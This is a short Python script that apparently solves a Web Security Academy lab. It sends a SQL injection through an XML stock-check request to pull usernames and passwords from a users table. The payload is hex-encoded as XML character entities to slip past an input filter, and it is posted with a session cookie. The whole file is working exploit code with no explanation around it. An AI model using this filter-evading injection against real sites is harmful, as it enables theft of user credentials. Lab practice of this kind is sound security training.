import requests

link = 'https://0adb00d0034027a783ca28c900c9008c.web-security-academy.net/product/stock' 
headers = { 
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
    "Accept": '*/*',
    'Origin': 'https://0adb00d0034027a783ca28c900c9008c.web-security-academy.net'
} 

cookie = {
    "session": "LbnS2nXUDhzDLgNyMQR8B7uGDPPmLT18"
}

def ofuscar_em_hex(texto, prefix='&#x', sufix=';'):
    return ''.join(f'{prefix}{ord(c):x}{sufix}' for c in texto)

payload = "union select '# '||username||' - '||password from users"
codigo = ofuscar_em_hex(payload)
xml=f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 {codigo}</storeId></stockCheck>'

response = requests.post(link, cookies=cookie, headers=headers, data=xml)
print(f'- {response.status_code} -') 
print(f'{response.text}')